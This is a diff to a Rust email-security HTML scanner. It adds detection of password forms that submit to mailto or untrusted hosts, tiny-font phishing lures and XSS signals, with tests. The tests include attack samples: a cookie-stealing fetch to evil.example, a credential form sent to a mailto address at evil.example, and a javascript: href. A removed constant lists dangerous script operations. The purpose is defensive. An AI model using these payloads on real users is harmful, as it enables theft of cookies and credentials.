@@ -6,12 +6,14 @@ use std::time::Instant;
 use async_trait::async_trait;
 use chrono::Utc;
 use regex::Regex;
+use serde::Deserialize;
 
 use crate::context::SecurityContext;
 use crate::error::EngineError;
 use crate::matcher::css_hidden_content_patterns;
 use crate::module::{Evidence, ModuleMetadata, ModuleResult, Pillar, SecurityModule, ThreatLevel};
 use crate::module_data::module_data;
+use crate::modules::content_scan::html_utils::count_css_hidden_class_markup;
 
 /// Unicode bidirectional control characters used in RTL-override attacks
 /// (filename spoofing, URL deception). U+202E is the classic "reverse text"
@@ -69,6 +71,23 @@ static JS_HREF_RE: LazyLock<Regex> = LazyLock::new(|| {
         .expect("valid js href regex")
 });
 
+static FORM_BLOCK_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r"(?is)<form\b([^>]*)>(.*?)</form\s*>").expect("valid form block regex")
+});
+
+static FORM_ACTION_ATTR_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?is)\saction\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))"#)
+        .expect("valid form action regex")
+});
+
+static INPUT_TAG_RE: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?is)<input\b[^>]*>").expect("valid input tag regex"));
+
+static INPUT_TYPE_ATTR_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?is)\stype\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))"#)
+        .expect("valid input type regex")
+});
+
 static IFRAME_TAG_RE: LazyLock<Regex> =
     LazyLock::new(|| Regex::new(r"(?is)<iframe\b[^>]*>").expect("valid iframe tag regex"));
 
@@ -84,6 +103,14 @@ static IFRAME_CLASS_RE: LazyLock<Regex> = LazyLock::new(|| {
 
 static IFRAME_EVENT_ATTR_RE: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"(?is)\bon[a-z]+\s*=").expect("valid iframe event attribute regex")
+});
+
+/// Match iframe event attributes together with their value.  An empty
+/// `onerror`/`onload` attribute is inert HTML emitted by some mail clients;
+/// only a non-empty handler is actionable XSS evidence.
+static IFRAME_EVENT_VALUE_RE: LazyLock<Regex> = LazyLock::new(|| {
+    Regex::new(r#"(?is)\bon[a-z]+\s*=\s*(?:\"([^\"]*)\"|'([^']*)'|([^\s>]+))"#)
+        .expect("valid iframe event value regex")
 });
 
 pub struct HtmlScanModule {
@@ -172,12 +199,119 @@ fn html_attribute_value<'a>(regex: &Regex, tag: &'a str) -> Option<&'a str> {
     (1..=3).find_map(|index| first.get(index).map(|value| value.as_str()))
 }
 
+fn attribute_uses_mailto_scheme(value: &str) -> bool {
+    let decoded = crate::modules::content_scan::html_utils::decode_html_entities(value);
+    let Some(colon) = decoded
+        .char_indices()
+        .take_while(|(index, _)| *index < 24)
+        .find(|(_, ch)| *ch == ':')
+        .map(|(index, _)| index)
+    else {
+        return false;
+    };
+    decoded[..colon]
+        .chars()
+        .filter(|ch| !ch.is_ascii_whitespace() && !ch.is_control())
+        .collect::<String>()
+        .eq_ignore_ascii_case("mailto")
+}
+
+fn attribute_uses_untrusted_http_target(value: &str) -> bool {
+    let decoded = crate::modules::content_scan::html_utils::decode_html_entities(value);
+    let Ok(parsed) = url::Url::parse(decoded.trim()) else {
+        return false;
+    };
+    if !matches!(parsed.scheme(), "http" | "https") {
+        return false;
+    }
+    let Some(host) = parsed.host_str() else {
+        return false;
+    };
+    let host = host.trim_end_matches('.').to_ascii_lowercase();
+    let official_sso = module_data()
+        .get_list("official_sso_domains")
+        .iter()
+        .any(|domain| host == *domain || host.ends_with(&format!(".{domain}")));
+    !crate::modules::link_scan::is_trusted_url_domain(&host) && !official_sso
+}
+
+fn form_action_is_credential_target(value: &str) -> bool {
+    attribute_uses_mailto_scheme(value) || attribute_uses_untrusted_http_target(value)
+}
+
+/// Detect a browser-submittable credential exfiltration form. `mailto:` and
+/// trusted first-party/SSO actions are common in legitimate mail, so the form
+/// becomes actionable only when it contains a password input and submits to
+/// either mailto or an untrusted HTTP(S) host. Structure is scanned
+/// on a view that does not expand `&lt;form&gt;`, preventing escaped examples
+/// in security training mail from manufacturing a finding.
+fn credential_form_findings(html: &str) -> Vec<Evidence> {
+    FORM_BLOCK_RE
+        .captures_iter(html)
+        .take(32)
+        .filter_map(|captures| {
+            let attrs = captures.get(1)?.as_str();
+            let body = captures.get(2)?.as_str();
+            let action = html_attribute_value(&FORM_ACTION_ATTR_RE, attrs)?;
+            if !form_action_is_credential_target(action) {
+                return None;
+            }
+            let has_password_input = INPUT_TAG_RE.find_iter(body).any(|input| {
+                html_attribute_value(&INPUT_TYPE_ATTR_RE, input.as_str())
+                    .is_some_and(|kind| kind.trim().eq_ignore_ascii_case("password"))
+            });
+            if !has_password_input {
+                return None;
+            }
+            Some(Evidence {
+                description:
+                    "HTML form submits a password field to mailto or an untrusted HTTP(S) target (credential exfiltration)"
+                        .to_string(),
+                location: Some("body_html:form".to_string()),
+                snippet: captures
+                    .get(0)
+                    .map(|matched| matched.as_str().chars().take(240).collect()),
+            })
+        })
+        .collect()
+}
+
+#[derive(Debug, Clone, Deserialize)]
+struct MailtoCredentialFormPolicy {
+    enabled: bool,
+    result_category: String,
+    score: f64,
+}
+
+fn mailto_credential_form_policy() -> Option<MailtoCredentialFormPolicy> {
+    let policy = serde_json::from_value::<MailtoCredentialFormPolicy>(
+        module_data()
+            .get_structured("html_mailto_credential_form_policy_v1")?
+            .clone(),
+    )
+    .ok()?;
+    (policy.enabled
+        && !policy.result_category.trim().is_empty()
+        && (0.65..=1.0).contains(&policy.score))
+    .then_some(policy)
+}
+
+pub(crate) fn is_credential_exfiltration_form_category(category: &str) -> bool {
+    mailto_credential_form_policy().is_some_and(|policy| category == policy.result_category)
+}
+
 /// QQ Mail injects this exact first-party frame as an advertising/template
 /// container. It is not sender-authored active content. Keep the exemption
 /// narrow: exact HTTPS origin/path, expected template class, and no event or
 /// srcdoc attributes. Every other iframe retains the original XSS score.
 fn is_trusted_qq_mail_template_iframe(tag: &str) -> bool {
     let tag_lower = tag.to_lowercase();
+    // A duplicate `src` attribute is ambiguous to HTML parsers and can hide a
+    // different effective destination.  Do not let the first trusted-looking
+    // value grant the template exemption.
+    if IFRAME_SRC_RE.find_iter(&tag_lower).count() != 1 {
+        return false;
+    }
     let src = html_attribute_value(&IFRAME_SRC_RE, &tag_lower).unwrap_or_default();
     let classes = html_attribute_value(&IFRAME_CLASS_RE, &tag_lower).unwrap_or_default();
 
@@ -196,6 +330,25 @@ fn inspect_iframes(html: &str) -> (usize, usize, Option<String>) {
 
     for iframe_match in IFRAME_TAG_RE.find_iter(html) {
         let tag = iframe_match.as_str();
+        let tag_lower = tag.to_lowercase();
+        let src_attribute_count = IFRAME_SRC_RE.find_iter(&tag_lower).count();
+        let empty_src = src_attribute_count == 0
+            || (src_attribute_count == 1
+                && html_attribute_value(&IFRAME_SRC_RE, &tag_lower)
+                    .is_some_and(|src| src.trim().is_empty()));
+        let has_nonempty_event_handler =
+            IFRAME_EVENT_VALUE_RE.captures_iter(&tag_lower).any(|caps| {
+                (1..=3)
+                    .find_map(|idx| caps.get(idx).map(|m| m.as_str().trim()))
+                    .is_some_and(|value| !value.is_empty())
+            });
+
+        // Empty iframes with no srcdoc and no executable event handler have
+        // no remote or inline payload.  They are common sanitiser/MUA
+        // artefacts and must not manufacture an XSS finding.
+        if empty_src && !tag_lower.contains("srcdoc") && !has_nonempty_event_handler {
+            continue;
+        }
         if is_trusted_qq_mail_template_iframe(tag) {
             trusted_count += 1;
         } else {
@@ -214,7 +367,9 @@ fn analyze_scripts(html_lower: &str, html_original: &str) -> (f64, Vec<Evidence>
     let mut score = 0.0f64;
     let mut evidence = Vec::new();
     let mut search_from = 0;
-    let dangerous_script_ops = module_data().get_list("dangerous_script_ops").to_vec();
+    let md = module_data();
+    let dangerous_script_ops = md.get_list("dangerous_script_ops").to_vec();
+    let active_script_risk_ops = md.get_list("active_script_risk_ops").to_vec();
 
     while let Some(open_idx) = html_lower[search_from..].find("<script") {
         let abs_open = search_from + open_idx;
@@ -235,9 +390,15 @@ fn analyze_scripts(html_lower: &str, html_original: &str) -> (f64, Vec<Evidence>
             .iter()
             .filter(|op| script_body.contains(op.as_str()))
             .collect();
+        let has_active_risk_op = active_script_risk_ops
+            .iter()
+            .any(|op| script_body.contains(op.as_str()));
 
-        if !dangerous_hits.is_empty() {
-            // Contains dangerous operations -> high severity
+        if !dangerous_hits.is_empty() && has_active_risk_op {
+            // Generic functions, timers, and DOM text updates occur in
+            // ordinary statement/newsletter templates. Require a configured
+            // active source/sink/navigation/network/payload operation before
+            // treating inline script as XSS evidence.
             score += 0.30;
             let ops: Vec<String> = dangerous_hits.iter().map(|s| s.to_string()).collect();
             let snip_start = abs_open.saturating_sub(10);
@@ -268,23 +429,9 @@ fn check_suspicious_event_handlers(html_lower: &str, html_original: &str) -> Vec
         Regex::new(r#"(?is)\bon(?:error|load)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s>]+))"#)
             .expect("event handler regex")
     });
-    const DANGEROUS_HANDLER_OPS: &[&str] = &[
-        "javascript:",
-        "alert(",
-        "eval(",
-        "fetch(",
-        "xmlhttprequest",
-        "document.cookie",
-        "document.location",
-        "window.location",
-        "window.open",
-        "location.href",
-        "atob(",
-        "fromcharcode",
-        "settimeout(",
-        "createelement(",
-        ".src=",
-    ];
+    let dangerous_handler_ops = module_data()
+        .get_list("dangerous_inline_event_handler_ops")
+        .to_vec();
 
     EVENT_HANDLER_RE
         .captures_iter(html_lower)
@@ -292,7 +439,11 @@ fn check_suspicious_event_handlers(html_lower: &str, html_original: &str) -> Vec
             let value = (1..=3)
                 .find_map(|idx| caps.get(idx).map(|m| m.as_str().trim()))
                 .unwrap_or_default();
-            if value.is_empty() || !DANGEROUS_HANDLER_OPS.iter().any(|op| value.contains(op)) {
+            if value.is_empty()
+                || !dangerous_handler_ops
+                    .iter()
+                    .any(|op| value.contains(op.as_str()))
+            {
                 return None;
             }
             let start = caps.get(0)?.start();
@@ -402,6 +553,18 @@ fn decode_numeric_entities(html: &str) -> String {
         .into_owned()
 }
 
+fn utf8_safe_slice(input: &str, start: usize, end: usize) -> String {
+    let mut safe_start = start.min(input.len());
+    while safe_start > 0 && !input.is_char_boundary(safe_start) {
+        safe_start -= 1;
+    }
+    let mut safe_end = end.min(input.len());
+    while safe_end < input.len() && !input.is_char_boundary(safe_end) {
+        safe_end += 1;
+    }
+    input[safe_start..safe_end].to_string()
+}
+
 /// Count Unicode bidirectional control characters (RLO/LRO/RLI/LRI/...) in
 /// the HTML body. Returns `(total_count, distinct_char_count)`. Any presence
 /// of these outside of legitimate multilingual content is a strong signal of
@@ -454,15 +617,27 @@ fn without_style_blocks(html_lower: &str) -> String {
 /// evade visual inspection and remains a meaningful signal.
 fn count_suspicious_hidden_inline_markup(html_lower_without_style: &str) -> usize {
     static HIDDEN_INLINE_RE: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r#"(?is)<([a-z][a-z0-9]*)\b[^>]*\bstyle\s*=\s*[\"']([^\"']*)[\"'][^>]*>"#)
+            .expect("valid hidden inline markup regex")
+    });
+    static HIDDEN_DECLARATION_RE: LazyLock<Regex> = LazyLock::new(|| {
+        // Match a complete CSS declaration value: the prefix `font-size:1`
+        // in ordinary 12px/14px/18px text does not make that text hidden.
         Regex::new(
-            r#"(?is)<([a-z][a-z0-9]*)\b[^>]*\bstyle\s*=\s*[\"'][^\"']*(?:display\s*:\s*none|visibility\s*:\s*hidden|font-size\s*:\s*0(?:px)?)[^\"']*[\"'][^>]*>"#,
+            r"(?is)(?:^|;)\s*(?:display\s*:\s*none|visibility\s*:\s*hidden|font-size\s*:\s*(?:0(?:px|pt)?|1(?:px|pt)?))\s*(?:!important\s*)?(?:;|$)",
         )
-        .expect("valid hidden inline markup regex")
+        .expect("valid complete hidden CSS declaration regex")
     });
 
     HIDDEN_INLINE_RE
         .captures_iter(html_lower_without_style)
         .filter(|caps| {
+            if !caps
+                .get(2)
+                .is_some_and(|style| HIDDEN_DECLARATION_RE.is_match(style.as_str()))
+            {
+                return false;
+            }
             let tag = caps.get(1).map(|m| m.as_str()).unwrap_or_default();
             if matches!(tag, "img" | "br" | "hr" | "td" | "th" | "tr" | "table") {
                 return false;
@@ -486,6 +661,102 @@ fn count_suspicious_hidden_inline_markup(html_lower_without_style: &str) -> usiz
             true
         })
         .count()
+}
+
+/// Detect action-bearing text deliberately rendered at unreadable size and
+/// contrast. A tiny font alone is common in footers; promote only when the
+/// same hidden block contains an untrusted URL, a security/account context,
+/// an action, and a consequential expiry or suspension statement.
+fn tiny_font_actionable_payloads(ctx: &SecurityContext, html_lower: &str) -> Vec<String> {
+    static INLINE_STYLE_RE: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r#"(?is)<([a-z][a-z0-9]*)\b[^>]*\bstyle\s*=\s*[\"']([^\"']*)[\"'][^>]*>"#)
+            .expect("valid inline style tag regex")
+    });
+    static TINY_FONT_RE: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r"(?i)(?:^|;)\s*font-size\s*:\s*(?:0(?:px|pt)?|1(?:px|pt)?)\s*(?:;|$)")
+            .expect("valid tiny font style regex")
+    });
+    static LOW_CONTRAST_RE: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(
+            r"(?i)color\s*:\s*(?:#f[0-9a-f]f[0-9a-f]f[0-9a-f]|#fff(?:fff)?|white|transparent)",
+        )
+        .expect("valid low contrast style regex")
+    });
+    static URL_RE: LazyLock<Regex> = LazyLock::new(|| {
+        Regex::new(r#"(?i)https?://[^\s\"'<>]+"#).expect("valid hidden URL regex")
+    });
+
+    INLINE_STYLE_RE
+        .captures_iter(html_lower)
+        .filter_map(|captures| {
+            let tag = captures.get(1)?.as_str();
+            let style = captures.get(2)?.as_str();
+            if !matches!(tag, "p" | "span" | "div" | "li")
+                || !TINY_FONT_RE.is_match(style)
+                || !LOW_CONTRAST_RE.is_match(style)
+            {
+                return None;
+            }
+
+            let open_tag = captures.get(0)?;
+            let closing = format!("</{tag}");
+            let close_rel = html_lower[open_tag.end()..].find(&closing)?;
+            let inner = &html_lower[open_tag.end()..open_tag.end() + close_rel];
+            let has_external_untrusted_url = URL_RE.find_iter(inner).any(|matched| {
+                let raw = matched.as_str().trim_end_matches([
+                    '.', ',', ';', ':', '!', '?', '，', '。', '；', '：', ')', '）',
+                ]);
+                let Ok(parsed) = url::Url::parse(raw) else {
+                    return false;
+                };
+                let Some(host) = parsed.host_str().map(str::to_ascii_lowercase) else {
+                    return false;
+                };
+                matches!(parsed.scheme(), "http" | "https")
+                    && !ctx.is_internal_domain(&host)
+                    && !module_data().contains("protected_domains", &host)
+                    && !crate::modules::link_scan::is_trusted_url_domain(&host)
+                    && !crate::modules::link_scan::is_well_known_safe_domain(&host)
+            });
+            let has_security_context = [
+                "account",
+                "vpn",
+                "password",
+                "credential",
+                "证书",
+                "账户",
+                "账号",
+                "凭据",
+                "权限",
+            ]
+            .iter()
+            .any(|term| inner.contains(term));
+            let has_recipient_action = [
+                "verify", "update", "renew", "check", "login", "立即", "更新", "核验", "验证",
+            ]
+            .iter()
+            .any(|term| inner.contains(term));
+            let has_consequence = [
+                "otherwise",
+                "unless",
+                "or your",
+                "否则",
+                "将无法",
+                "暂停",
+                "suspend",
+                "expire",
+                "过期",
+                "停用",
+            ]
+            .iter()
+            .any(|term| inner.contains(term));
+            (has_external_untrusted_url
+                && has_security_context
+                && has_recipient_action
+                && has_consequence)
+                .then(|| inner.chars().take(180).collect())
+        })
+        .collect()
 }
 
 fn has_responsive_media_css(html_lower: &str) -> bool {
@@ -657,7 +928,7 @@ impl SecurityModule for HtmlScanModule {
                 let snippet = if let Some(idx) = html_lower.find(&pat_lower) {
                     let snip_start = idx.saturating_sub(20);
                     let snip_end = (idx + pat_lower.len() + 40).min(body_html.len());
-                    Some(body_html[snip_start..snip_end].to_string())
+                    Some(utf8_safe_slice(body_html, snip_start, snip_end))
                 } else {
                     // Entity-form hit: the raw body has no literal occurrence,
                     // so take the snippet from the decoded view (UTF-8 safe).
@@ -754,6 +1025,20 @@ impl SecurityModule for HtmlScanModule {
             }
         }
 
+        // `mailto:` contact links and feedback forms are benign. A password
+        // input submitted through that scheme is different: clicking submit
+        // hands the entered credential to an attacker-selected mailbox while
+        // bypassing the HTTP link-analysis layer entirely. Treat the compound
+        // as one high-confidence HTML-deception cause (no per-input stacking).
+        if let Some(policy) = mailto_credential_form_policy() {
+            let credential_forms = credential_form_findings(&numeric_decoded);
+            if !credential_forms.is_empty() {
+                total_score += policy.score;
+                categories.push(policy.result_category);
+                evidence.extend(credential_forms);
+            }
+        }
+
         // CSS hidden text detection: display:none / visibility:hidden / font-size:0.
         // Responsive email templates routinely hide alternate images and layout
         // blocks in @media rules. Score hidden markup only when it is outside a
@@ -768,11 +1053,12 @@ impl SecurityModule for HtmlScanModule {
             let hidden_count = css_hidden_content_patterns()
                 .scan(&html_without_style)
                 .distinct_count();
+            let class_hidden_count = count_css_hidden_class_markup(body_html);
 
-            if hidden_count > 0 {
+            if hidden_count > 0 || class_hidden_count > 0 {
                 let responsive_css = has_responsive_media_css(&html_lower);
                 let suspicious_hidden_count =
-                    count_suspicious_hidden_inline_markup(&html_without_style);
+                    count_suspicious_hidden_inline_markup(&html_without_style) + class_hidden_count;
 
                 if responsive_css && suspicious_hidden_count == 0 {
                     // Typical responsive template: hidden CSS declarations and
@@ -804,6 +1090,19 @@ impl SecurityModule for HtmlScanModule {
                     });
                 }
             }
+        }
+
+        let tiny_payloads = tiny_font_actionable_payloads(ctx, &html_lower);
+        if !tiny_payloads.is_empty() {
+            total_score += 0.56;
+            categories.push("css_hidden_content".to_string());
+            categories.push("hidden_external_action_lure".to_string());
+            categories.push("phishing".to_string());
+            evidence.push(Evidence {
+                description: "A tiny, low-contrast HTML block combines an external untrusted URL with an account/security action and a stated consequence".to_string(),
+                location: Some("body_html:hidden low-visibility text".to_string()),
+                snippet: tiny_payloads.into_iter().next(),
+            });
         }
 
         // Check overall HTML size for obfuscation indicator
@@ -1046,6 +1345,13 @@ mod tests {
     }
 
     #[test]
+    fn empty_iframe_without_payload_is_not_xss() {
+        let html = r#"<html><body><iframe src="" onerror=""></iframe></body></html>"#;
+        let result = analyze_html(html);
+        assert!(!result.categories.contains(&"xss".to_string()));
+    }
+
+    #[test]
     fn qq_mail_iframe_exemption_rejects_spoofed_or_duplicate_src() {
         for html in [
             r#"<iframe data-src="https://wxa.wxs.qq.com/tmpl/px/base_tmpl.html" src="https://evil.example/login" class="iframe_ad_container"></iframe>"#,
@@ -1161,10 +1467,9 @@ mod tests {
             result.categories
         );
         assert!(
-            result
-                .evidence
-                .iter()
-                .any(|e| e.description.contains("Meta refresh redirect target is suspicious")),
+            result.evidence.iter().any(|e| e
+                .description
+                .contains("Meta refresh redirect target is suspicious")),
             "refresh target URL analysis must still run on the extracted URL: {:?}",
             result.evidence
         );
@@ -1188,7 +1493,8 @@ mod tests {
         assert_eq!(distinct, 1);
 
         let hex_html = "<p>&#x202E;payload&#x202C;</p>";
-        let (hex_total, hex_distinct) = count_bidi_control_chars(&decode_numeric_entities(hex_html));
+        let (hex_total, hex_distinct) =
+            count_bidi_control_chars(&decode_numeric_entities(hex_html));
         assert_eq!(hex_total, 2);
         assert_eq!(hex_distinct, 2);
     }
@@ -1197,7 +1503,9 @@ mod tests {
     fn numeric_entity_encoded_bidi_triggers_module_category() {
         let result = analyze_html("<p>open &#8238; this file</p>");
         assert!(
-            result.categories.contains(&"bidi_override_attack".to_string()),
+            result
+                .categories
+                .contains(&"bidi_override_attack".to_string()),
             "entity-encoded RLO must count toward the BIDI signal: {:?}",
             result.categories
         );
@@ -1280,6 +1588,91 @@ mod tests {
     }
 
     #[test]
+    fn mailto_password_form_is_credential_exfiltration() {
+        let result = analyze_html(
+            r#"<form action='mailto:conf1rm@evil.example?subject=verify' method='post'>
+                账号 <input name='account'>
+                密码 <input type='password' name='password'>
+                <button>提交确认</button>
+            </form>"#,
+        );
+
+        assert!(
+            result
+                .categories
+                .contains(&"credential_exfiltration_form".to_string()),
+            "password + mailto form must be actionable: {result:?}"
+        );
+        assert!(result.threat_level >= ThreatLevel::High, "{result:?}");
+    }
+
+    #[test]
+    fn entity_and_whitespace_obfuscated_mailto_password_form_is_detected() {
+        let result = analyze_html(
+            r#"<FORM ACTION='ma&Tab;il&#116;o:collect@evil.example'>
+                <INPUT TYPE='PASSWORD' name='secret'>
+            </FORM>"#,
+        );
+
+        assert!(
+            result
+                .categories
+                .contains(&"credential_exfiltration_form".to_string()),
+            "browser-decoded mailto scheme must not bypass the compound: {result:?}"
+        );
+    }
+
+    #[test]
+    fn untrusted_https_password_form_is_credential_exfiltration() {
+        let result = analyze_html(
+            r#"<form action='https://learn-portal.example.co/session'>
+                工号 <input name='uid'>
+                域密码 <input type='password' name='pwd'>
+            </form>"#,
+        );
+
+        assert!(
+            result
+                .categories
+                .contains(&"credential_exfiltration_form".to_string()),
+            "password + untrusted HTTPS action must be actionable: {result:?}"
+        );
+    }
+
+    #[test]
+    fn official_sso_password_form_is_not_exfiltration() {
+        let result = analyze_html(
+            r#"<form action='https://login.microsoftonline.com/common/oauth2/v2.0/authorize'>
+                <input type='password' name='pwd'>
+            </form>"#,
+        );
+
+        assert!(
+            !result
+                .categories
+                .contains(&"credential_exfiltration_form".to_string()),
+            "official SSO target must not be treated as an attacker mailbox: {result:?}"
+        );
+    }
+
+    #[test]
+    fn ordinary_mailto_contact_surfaces_stay_safe() {
+        for html in [
+            r#"<a href='mailto:support@example.com'>联系我们</a>"#,
+            r#"<form action='mailto:feedback@example.com'><input name='comment'><button>反馈</button></form>"#,
+            r#"&lt;form action='mailto:demo@example.com'&gt;&lt;input type='password'&gt;&lt;/form&gt;"#,
+        ] {
+            let result = analyze_html(html);
+            assert!(
+                !result
+                    .categories
+                    .contains(&"credential_exfiltration_form".to_string()),
+                "mailto without a real password form is not credential exfiltration: {result:?}"
+            );
+        }
+    }
+
+    #[test]
     fn responsive_css_hidden_images_are_not_textual_payloads() {
         let html = r#"
             <style>@media (max-width: 736px) {
@@ -1310,13 +1703,84 @@ mod tests {
     }
 
     #[test]
+    fn ordinary_report_font_sizes_are_not_hidden_css_values() {
+        let html = r#"<div style="font-size:18px">报告下载</div>
+            <span style="font-size:14px">您的企业信用报告已经生成，请下载浏览。</span>
+            <div style="font-size:13px">本数据仅供参考。</div>
+            <span style="font-size:12pt">Generated successfully.</span>
+            <span style="font-size:100px">Report</span>
+            <td style="overflow:hidden;font-size:0;line-height:0">
+                <img src="https://tracking.example.test/open.gif" width="1" height="1">
+            </td>"#;
+
+        assert_eq!(count_suspicious_hidden_inline_markup(html), 0);
+        let result = analyze_html(html);
+        assert_eq!(result.threat_level, ThreatLevel::Safe);
+        assert!(
+            !result
+                .categories
+                .contains(&"css_hidden_content".to_string())
+        );
+    }
+
+    #[test]
+    fn complete_hidden_css_values_remain_hidden_text_signals() {
+        for style in [
+            "font-size:0",
+            "font-size:0px;",
+            "font-size:0pt !important;",
+            "font-size:1px",
+            "font-size:1pt !important",
+            "display:none!important",
+            "visibility:hidden;",
+        ] {
+            let html = format!("<span style=\"{style}\">verify your account password</span>");
+            assert_eq!(count_suspicious_hidden_inline_markup(&html), 1, "{style}");
+            // A single hidden block scores below Low and is returned through
+            // safe_analyzed, which intentionally drops the categories.
+            assert!(
+                analyze_html(&html.repeat(3))
+                    .categories
+                    .contains(&"css_hidden_content".to_string())
+            );
+        }
+    }
+
+    #[test]
+    fn ordinary_statement_timer_script_is_not_xss() {
+        let result = analyze_html(
+            r#"<html><body><span id="clock"></span><script>
+               function refreshClock() {
+                 document.getElementById('clock').innerHTML = '账单生成中';
+               }
+               setInterval(refreshClock, 1000);
+               </script></body></html>"#,
+        );
+
+        assert!(
+            !result.categories.contains(&"xss".to_string()),
+            "functions, timers and text updates alone are normal template behavior: {:?}",
+            result.categories
+        );
+    }
+
+    #[test]
+    fn inline_script_with_network_exfiltration_remains_xss() {
+        let result = analyze_html(
+            r#"<script>fetch('https://evil.example/collect?c=' + document.cookie)</script>"#,
+        );
+
+        assert!(result.categories.contains(&"xss".to_string()));
+        assert!(result.threat_level >= ThreatLevel::Low);
+    }
+
+    #[test]
     fn entity_encoded_javascript_protocol_is_detected() {
         // PoC: jav&#97;script: renders as javascript: in the MUA, but the raw
         // HTML never contains the literal token — before the fix both the flat
         // "javascript:" pattern and the href-attribute matcher went blind.
-        let result = analyze_html(
-            r#"<a href="jav&#97;script:alert(document.cookie)">点这里查看</a>"#,
-        );
+        let result =
+            analyze_html(r#"<a href="jav&#97;script:alert(document.cookie)">点这里查看</a>"#);
 
         assert!(
             result.threat_level >= ThreatLevel::Low,
@@ -1351,10 +1815,9 @@ mod tests {
             result.categories
         );
         assert!(
-            result
-                .evidence
-                .iter()
-                .any(|e| e.description.contains("Meta refresh redirect target is suspicious")),
+            result.evidence.iter().any(|e| e
+                .description
+                .contains("Meta refresh redirect target is suspicious")),
             "refresh target URL analysis must run on the decoded tag: {:?}",
             result.evidence
         );
